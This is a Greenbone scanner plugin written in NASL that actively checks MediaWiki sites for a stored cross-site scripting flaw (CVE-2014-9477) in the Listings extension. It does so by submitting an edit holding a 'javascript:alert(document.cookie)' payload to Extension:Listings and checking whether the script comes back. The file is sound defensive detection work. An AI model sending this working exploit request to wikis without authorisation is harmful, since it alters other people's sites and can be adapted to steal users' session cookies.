# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:mediawiki:mediawiki";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805326");
  script_version("2024-07-16T05:05:43+0000");
  script_cve_id("CVE-2014-9477");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2024-07-16 05:05:43 +0000 (Tue, 16 Jul 2024)");
  script_tag(name:"creation_date", value:"2015-01-23 12:37:41 +0530 (Fri, 23 Jan 2015)");
  script_name("MediaWiki Listings Extension < 1.2.0 XSS Vulnerability (Jan 2015) - Active Check");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_mediawiki_http_detect.nasl");
  script_mandatory_keys("mediawiki/http/detected");
  script_require_ports("Services/www", 80);

  script_xref(name:"URL", value:"https://phabricator.wikimedia.org/T77624");
  script_xref(name:"URL", value:"http://www.openwall.com/lists/oss-security/2015/01/03/13");

  script_tag(name:"summary", value:"The Listings extension for MediaWiki is prone to a cross-site
  scripting (XSS) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"The flaw exists as input passed via 'name' or 'url' POST
  parameter to the 'Extension:Listings' script is not validated before returning it to users.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attacker to execute
  arbitrary script code in a user's browser session within the trust relationship between their
  browser and the server.");

  script_tag(name:"affected", value:"The Listings extension for Mediawiki in versions prior to
  1.2.0.");

  script_tag(name:"solution", value:"Update the Listings extension to version 1.2.0 or later.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

host = http_host_name(port:port);

res = http_get_cache(item:dir + "/index.php/Special:Version", port:port);

if (res =~ ">Listings<") {

  # nb: Don't use http_get_cache() here, we need to retrieve "non-cached" data.
  url = dir + "/index.php?title=Extension:Listings&action=submit";
  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req);

  wpStarttime = eregmatch(pattern:'value="([0-9]*)" name="wpStarttime"', string:res);
  if(!wpStarttime[1])
    exit(0);

  wpEdittime = eregmatch(pattern:'value="([0-9]*)" name="wpEdittime"', string:res);
  if(!wpEdittime[1])
    exit(0);

  wpAutoSummary = eregmatch(pattern:'value="([0-9a-zA-Z]*)" name="wpAutoSummary"', string:res);
  if(!wpAutoSummary[1])
    exit(0);

  oldid = eregmatch(pattern:'value="([0-9a-zA-Z]*)" name="oldid"', string:res);
  if(!oldid[1])
    exit(0);

  postData = string('-----------------------------7523421607973306651860038372\r\n',
                    'Content-Disposition: form-data; name="wpAntispam"\r\n\r\n\r\n',
                    '-----------------------------7523421607973306651860038372\r\n',
                    'Content-Disposition: form-data; name="wpSection"\r\n\r\n\r\n',
                    '-----------------------------7523421607973306651860038372\r\n',
                    'Content-Disposition: form-data; name="wpStarttime"\r\n\r\n',
                    wpStarttime[1], '\r\n',
                    '-----------------------------7523421607973306651860038372\r\n',
                    'Content-Disposition: form-data; name="wpEdittime"\r\n\r\n',
                    wpEdittime[1], '\r\n',
                    '-----------------------------7523421607973306651860038372\r\n',
                    'Content-Disposition: form-data; name="wpScrolltop"\r\n\r\n0\r\n',
                    '-----------------------------7523421607973306651860038372\r\n',
                    'Content-Disposition: form-data; name="wpAutoSummary"\r\n\r\n',
                    wpAutoSummary, '\r\n',
                    '-----------------------------7523421607973306651860038372\r\n',
                    'Content-Disposition: form-data; name="oldid"\r\n\r\n', oldid[1], '\r\n',
                    '-----------------------------7523421607973306651860038372\r\n',
                    'Content-Disposition: form-data; name="wpTextbox1"\r\n\r\n',
                    '<buy name="do" url="javascript:alert(document.cookie)" >anything</buy>\r\n\r\n',
                    '-----------------------------7523421607973306651860038372\r\n',
                    'Content-Disposition: form-data; name="wpSummary"\r\n\r\n\r\n',
                    '-----------------------------7523421607973306651860038372\r\n',
                    'Content-Disposition: form-data; name="wpSave"\r\n\r\n',
                    'Save page\r\n',
                    '-----------------------------7523421607973306651860038372\r\n',
                    'Content-Disposition: form-data; name="wpEditToken"\r\n\r\n+\\\r\n',
                    '-----------------------------7523421607973306651860038372--\r\n');

  req = string("POST ", url, " HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "Content-Type: multipart/form-data;",
               "boundary=---------------------------7523421607973306651860038372\r\n",
               "Content-Length: ", strlen(postData), "\r\n\r\n",
               "\r\n", postData, "\r\n");
  res = http_send_recv(port:port, data:req);

  url = dir + "/index.php/Extension:Listings";
  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req);

  if(res =~ "^HTTP/1\.[01] 200" && "<script>alert(document.cookie)</script>" >< res) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
  exit(99);
}

exit(0);
